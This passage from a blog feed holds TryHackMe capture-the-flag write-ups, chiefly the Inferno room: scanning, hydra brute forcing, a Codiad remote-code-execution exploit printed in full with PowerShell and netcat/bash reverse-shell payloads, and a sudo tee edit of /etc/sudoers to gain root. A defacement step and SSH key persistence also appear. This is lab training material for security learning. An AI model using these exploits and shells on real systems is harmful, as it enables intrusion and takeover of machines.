&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Feel free to &lt;code&gt;root@duckyinc:~/.ssh# echo &amp;quot;{your_own_id_rsa.pub_key_here}&amp;quot; &amp;gt;&amp;gt; authorized_keys&lt;/code&gt; for a ssh login.&lt;/p&gt;
&lt;h3 id=&#34;32-defacing-website&#34;&gt;3.2. Defacing Website&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@duckyinc:/var/www/duckyinc/templates# echo &amp;quot;pwned by chaudhary1337&amp;quot; &amp;gt; index.html
root@duckyinc:/var/www/duckyinc/templates# cd ~
root@duckyinc:~# ls
flag3.txt
root@duckyinc:~# cat flag3.txt 
thm{yeee}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System compromised&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Inferno Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/</link>
        <pubDate>Sat, 26 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/4t9185h.jpg" alt="Featured image of post TryHackMe: Inferno Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/inferno&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 954 closed ports
PORT      STATE    SERVICE           VERSION
21/tcp    open     ftp?
22/tcp    open     ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open     telnet?
25/tcp    open     smtp?
|_smtp-commands: Couldn&#39;t establish connection on port 25
80/tcp    open     http              Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante&#39;s Inferno
88/tcp    open     kerberos-sec?
106/tcp   open     pop3pw?
110/tcp   open     pop3?
389/tcp   open     ldap?
443/tcp   open     https?
464/tcp   open     kpasswd5?
636/tcp   open     ldapssl?
777/tcp   open     multiling-http?
783/tcp   open     spamassassin?
808/tcp   open     ccproxy-http?
873/tcp   open     rsync?
1001/tcp  open     webpush?
1236/tcp  open     bvcontrol?
1300/tcp  open     h323hostcallsc?
1309/tcp  filtered jtag-server
1805/tcp  filtered enl-name
1863/tcp  filtered msnp
2000/tcp  open     cisco-sccp?
2003/tcp  open     finger?
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open     ccproxy-ftp?
2601/tcp  open     zebra?
2602/tcp  open     ripd?
2604/tcp  open     ospfd?
2605/tcp  open     bgpd?
2607/tcp  open     connection?
2608/tcp  open     wag-service?
4224/tcp  open     xtell?
5051/tcp  open     ida-agent?
5432/tcp  open     postgresql?
5555/tcp  open     freeciv?
5666/tcp  open     nrpe?
5998/tcp  filtered ncd-diag
6346/tcp  open     gnutella?
6566/tcp  open     sane-port?
6667/tcp  open     irc?
|_irc-info: Unable to open connection
8021/tcp  open     ftp-proxy?
8081/tcp  open     blackice-icecap?
8088/tcp  open     radan-http?
9418/tcp  open     git?
10000/tcp open     snet-sensor-mgmt?
10082/tcp open     amandaidx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see 42 serives running. Going through and testing each one of them is not possible.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.125.29
/index.html           (Status: 200) [Size: 638]
/inferno              (Status: 401) [Size: 459]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XdFKN0A.jpg&#34; alt=&#34;homepage of thm room inferno&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see some quotes, which may be from the inferno book. We can explore them later if needed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AClskWf.png&#34; alt=&#34;inferno page found asking for login and password&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see the page demanding login and password. Maybe we can try bruteforcing?&lt;/p&gt;
&lt;p&gt;Possible usernames:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;admin&lt;/li&gt;
&lt;li&gt;dante (the guy who wrote inferno)&lt;/li&gt;
&lt;li&gt;inferno (the name of the room)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;14-bruteforcing&#34;&gt;1.4. Bruteforcing&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.125.29 http-get /inferno -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 00:13:47
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.125.29:80/inferno
[STATUS] 6189.00 tries/min, 6189 tries in 00:01h, 14338210 to do in 38:37h, 64 active
[80][http-get] host: 10.10.125.29   login: admin   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 00:16:05
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! After logging in, we see another login form. Okay &amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1hOuete.png&#34; alt=&#34;another login form in the inferno page&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;15-codiad&#34;&gt;1.5. Codiad&lt;/h3&gt;
&lt;p&gt;Trying out the same creds gets us in. Now I looked for exploits for &lt;code&gt;codiad&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ searchsploit codiad                      
-------------------------- ---------------------------------
 Exploit Title            |  Path
-------------------------- ---------------------------------
Codiad 2.4.3 - Multiple V | php/webapps/35585.txt
Codiad 2.5.3 - Local File | php/webapps/36371.txt
Codiad 2.8.4 - Remote Cod | multiple/webapps/49705.py
-------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s try the RCE one!&lt;/p&gt;
&lt;p&gt;Running the exploit, we get &lt;code&gt;[-] Login failed! Please check your username and password.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But, we know for a fact that it is correct - otherwise we wouldn&amp;rsquo;t be able to login! Whats happening?&lt;/p&gt;
&lt;p&gt;Recall we had to login &lt;em&gt;another&lt;/em&gt; form before we saw this. Maybe adding the header of login password, as we saw before would help.&lt;/p&gt;
&lt;h3 id=&#34;16-custom-exploit&#34;&gt;1.6. Custom Exploit&lt;/h3&gt;
&lt;p&gt;I first inspect the request itself, by intercepting it using burp suite.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /inferno HTTP/1.1
Host: 10.10.125.29
Cache-Control: max-age=0
Authorization: Basic {base64_encoded_authorization}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like the line &lt;code&gt;Authorization: Basic {base64_encoded_authorization}&lt;/code&gt; is the one we are looking for.&lt;/p&gt;
&lt;p&gt;Decoing, we get &lt;code&gt;admin:{password}&lt;/code&gt;. Great! Our hypothesis was correct. We just need to add this auth line for all the requests made.&lt;/p&gt;
&lt;p&gt;Add the line &lt;code&gt;&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;&lt;/code&gt; to headers dictionary wherever present, or create a new one wherever not.&lt;/p&gt;
&lt;p&gt;The code is attached at the very bottom.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;h3 id=&#34;21-codilad-custom-rce&#34;&gt;2.1. Codilad Custom RCE&lt;/h3&gt;
&lt;p&gt;Okay finally! Following the instructions we get a reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ python3 codiad.py http://10.10.125.29/inferno/ admin {password} 10.17.8.184 1337 linux
[+] Please execute the following command on your vps: 
echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/10.17.8.184/1338 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 1337
nc -lnvp 1338
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {&amp;quot;status&amp;quot;:&amp;quot;success&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {&amp;quot;status&amp;quot;:&amp;quot;success&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;name&amp;quot;:&amp;quot;inferno&amp;quot;,&amp;quot;path&amp;quot;:&amp;quot;\/var\/www\/html\/inferno&amp;quot;}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;No Results Returned&amp;quot;}
[+] Exploit finished!
[+] Enjoy your reverse shell!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/2WKJRyi.png&#34; alt=&#34;getting remote code execution on the thm room inferno&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Looks like the connection was immediately closed. Uh. Let&amp;rsquo;s try again?&lt;/p&gt;
&lt;p&gt;Works! This time as soon as I got in, I spawned a bunch more bash shells. Threw in some &lt;code&gt;/bin/sh&lt;/code&gt; ones as well XD&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;22-exploring&#34;&gt;2.2 Exploring&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Users&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /home
ls
dante
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find / -type f -perm -u=s 2&amp;gt; /dev/null
/bin/su
/bin/umount
/bin/ping
/bin/mount
/bin/fusermount
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat /etc/crontab    
cat /etc/crontab
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file          
# and files in /etc/cron.d. These files also have username fields,          
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kernel status&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ uname -a
uname -a
Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upto date&lt;/p&gt;
&lt;h3 id=&#34;23-linpeas-enumeration&#34;&gt;2.3. LinPEAS enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ScLa4Dx.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                              
Sudo version 1.8.21p2 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Backup folders
drwxr-xr-x 2 root root 4096 Jun 26 03:55 /var/backups                                                                     
total 32
-rw-r--r-- 1 root root 30810 Jan 11 15:22 apt.extended_states.0

drwx------ 2 root root 4096 Jan 11 15:19 /etc/lvm/backup
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Searching specific hashes inside files - less false positives (limit 70)
/etc/apache2/.htpasswd:$apr1$UIfo4gwg$N4DRURQTtq/wytcy8pdGq.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing that we don&amp;rsquo;t already know.&lt;/p&gt;
&lt;h3 id=&#34;24-manual-exploration&#34;&gt;2.4. Manual Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ ls -la /home/dante/Downloads
ls -la /home/dante/Downloads
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see some hex characters. Let&amp;rsquo;s use &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CyberChef&lt;/a&gt; to decode. We get the password for dante user!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dante:{this_is_in_the_last_line!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ ssh dante@10.10.125.29          
The authenticity of host &#39;10.10.125.29 (10.10.125.29)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.125.29&#39; (ECDSA) to the list of known hosts.
dante@10.10.125.29&#39;s password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 26 05:36:39 UTC 2021

  System load:  0.0               Processes:           620
  Usage of /:   42.2% of 8.79GB   Users logged in:     0
  Memory usage: 77%               IP address for eth0: 10.10.125.29
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yess! Finally SSH after the ***tty shells. This has the same issue btw, so make sure to spam shells (&lt;code&gt;sh&lt;/code&gt; looks immune, bash gets killed :thonk:).&lt;/p&gt;
&lt;h3 id=&#34;31-sudo&#34;&gt;3.1. sudo&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have it here on &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/tee/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the one liner exploit for sudo tee: &lt;code&gt;echo &amp;quot;dante    ALL=(ALL:ALL) ALL&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;What happened here?&lt;/p&gt;
&lt;p&gt;man tee:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;man page of tee: &lt;code&gt;tee - read from standard input and write to standard output and files&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;-a flag appends data&lt;/li&gt;
&lt;li&gt;we echo the line giving us all the permissions&lt;/li&gt;
&lt;li&gt;and pipe it to sudo tee with the -a flag to append it in the /etc/sudoers file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Resultant:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
    (ALL : ALL) ALL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo su
root@Inferno:/home/dante# sh
# cd /root
# ls
proof.txt
# cat proof.txt
Congrats!

You&#39;ve rooted Inferno!

{system_compromised}

mindsflee

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
&lt;h2 id=&#34;a-appendix-rce-codilad-custom-exploit-code&#34;&gt;A. Appendix: RCE Codilad Custom Exploit Code&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009

#!/usr/bin/env python
# encoding: utf-8
import requests
import sys
import json
import base64

session = requests.Session()


def login(domain, username, password):
    global session
    url = domain + &amp;quot;/components/user/controller.php?action=authenticate&amp;quot;
    data = {
        &amp;quot;username&amp;quot;: username,
        &amp;quot;password&amp;quot;: password,
        &amp;quot;theme&amp;quot;: &amp;quot;default&amp;quot;,
        &amp;quot;language&amp;quot;: &amp;quot;en&amp;quot;,
    }
    response = session.post(
        url,
        data=data,
        verify=False,
        headers={&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;},
    )
    content = response.text
    print(&amp;quot;[+] Login Content : %s&amp;quot; % (content))
    if &#39;status&amp;quot;:&amp;quot;success&amp;quot;&#39; in content:
        return True


def get_write_able_path(domain):
    global session
    url = domain + &amp;quot;/components/project/controller.php?action=get_current&amp;quot;
    response = session.get(
        url, verify=False, headers={&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;}
    )
    content = response.text
    print(&amp;quot;[+] Path Content : %s&amp;quot; % (content))
    json_obj = json.loads(content)
    if json_obj[&amp;quot;status&amp;quot;] == &amp;quot;success&amp;quot;:
        return json_obj[&amp;quot;data&amp;quot;][&amp;quot;path&amp;quot;]
    else:
        return False


def base64_encode_2_bytes(host, port):
    payload = &amp;quot;&amp;quot;&amp;quot;
    $client = New-Object System.Net.Sockets.TCPClient(&amp;quot;__HOST__&amp;quot;,__PORT__);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..255|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );
        $sendback2  = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    &amp;quot;&amp;quot;&amp;quot;
    result = &amp;quot;&amp;quot;
    for i in payload.replace(&amp;quot;__HOST__&amp;quot;, host).replace(&amp;quot;__PORT__&amp;quot;, str(port)):
        result += i + &amp;quot;\x00&amp;quot;
    return base64.b64encode(result.encode()).decode().replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;)


def build_powershell_payload(host, port):
    preffix = &amp;quot;powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc &amp;quot;
    return preffix + base64_encode_2_bytes(host, port).replace(&amp;quot;+&amp;quot;, &amp;quot;%2b&amp;quot;)


def exploit(domain, username, password, host, port, path, platform):
    global session
    url = (
        domain
        + &amp;quot;components/filemanager/controller.php?type=1&amp;amp;action=search&amp;amp;path=%s&amp;quot; % (path)
    )
    if platform.lower().startswith(&amp;quot;win&amp;quot;):
        # new version escapeshellarg
        # escapeshellarg on windows will quote the arg with &amp;quot;&amp;quot;
        # so we need to try twice
        payload = &amp;quot;||%s||&amp;quot; % (build_powershell_payload(host, port))
        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
        headers = {
            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
        }
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
        # old version escapeshellarg
        payload = &amp;quot;%%22||%s||&amp;quot; % (build_powershell_payload(host, port))
        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
        headers = {
            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
        }
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
    else:
        # payload = &#39;&#39;&#39;SniperOJ%22%0A%2Fbin%2Fbash+-c+&#39;sh+-i+%3E%26%2Fdev%2Ftcp%2F&#39;&#39;&#39; + host + &#39;&#39;&#39;%2F&#39;&#39;&#39; + port + &#39;&#39;&#39;+0%3E%261&#39;%0Agrep+%22SniperOJ&#39;&#39;&#39;
        payload = &#39;&amp;quot;%%0Anc %s %d|/bin/bash %%23&#39; % (host, port)
        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
        headers = {
            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
        }
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)


def promote_yes(hint):
    print(hint)
    while True:
        ans = input(&amp;quot;[Y/n] &amp;quot;).lower()
        if ans == &amp;quot;n&amp;quot;:
            return False
        elif ans == &amp;quot;y&amp;quot;:
            return True
        else:
            print(&amp;quot;Incorrect input&amp;quot;)


def main():
    if len(sys.argv) != 7:
        print(&amp;quot;Usage : &amp;quot;)
        print(
            &amp;quot;        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&amp;quot;
            % (sys.argv[0])
        )
        print(
            &amp;quot;        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&amp;quot;
            % (sys.argv[0])
        )
        print(&amp;quot;Example : &amp;quot;)
        print(
            &amp;quot;        python %s http://localhost/ admin admin 8.8.8.8 8888 linux&amp;quot;
            % (sys.argv[0])
        )
        print(
            &amp;quot;        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows&amp;quot;
            % (sys.argv[0])
        )
        print(&amp;quot;Author : &amp;quot;)
        print(&amp;quot;        WangYihang &amp;lt;wangyihanger@gmail.com&amp;gt;&amp;quot;)
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    host = sys.argv[4]
    port = int(sys.argv[5])
    platform = sys.argv[6]
    if platform.lower().startswith(&amp;quot;win&amp;quot;):
        print(&amp;quot;[+] Please execute the following command on your vps: &amp;quot;)
        print(&amp;quot;nc -lnvp %d&amp;quot; % (port))
        if not promote_yes(
            &amp;quot;[+] Please confirm that you have done the two command above [y/n]&amp;quot;
        ):
            exit(1)
    else:
        print(&amp;quot;[+] Please execute the following command on your vps: &amp;quot;)
        print(
            &amp;quot;echo &#39;bash -c \&amp;quot;bash -i &amp;gt;/dev/tcp/%s/%d 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1\&amp;quot;&#39; | nc -lnvp %d&amp;quot;
            % (host, port + 1, port)
        )
        print(&amp;quot;nc -lnvp %d&amp;quot; % (port + 1))
        if not promote_yes(
            &amp;quot;[+] Please confirm that you have done the two command above [y/n]&amp;quot;
        ):
            exit(1)
    print(&amp;quot;[+] Starting...&amp;quot;)
    if not login(domain, username, password):
        print(&amp;quot;[-] Login failed! Please check your username and password.&amp;quot;)
        exit(2)
    print(&amp;quot;[+] Login success!&amp;quot;)
    print(&amp;quot;[+] Getting writeable path...&amp;quot;)
    path = get_write_able_path(domain)
    if path == False:
        print(&amp;quot;[+] Get current path error!&amp;quot;)
        exit(3)
    print(&amp;quot;[+] Writeable Path : %s&amp;quot; % (path))
    print(&amp;quot;[+] Sending payload...&amp;quot;)
    exploit(domain, username, password, host, port, path, platform)
    print(&amp;quot;[+] Exploit finished!&amp;quot;)
    print(&amp;quot;[+] Enjoy your reverse shell!&amp;quot;)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>TryHackMe: Cooctus Stories Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-cooctus-stories-writeup/</link>
        <pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-cooctus-stories-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/TNBJTMz.png" alt="Featured image of post TryHackMe: Cooctus Stories Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/cooctusadventures&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
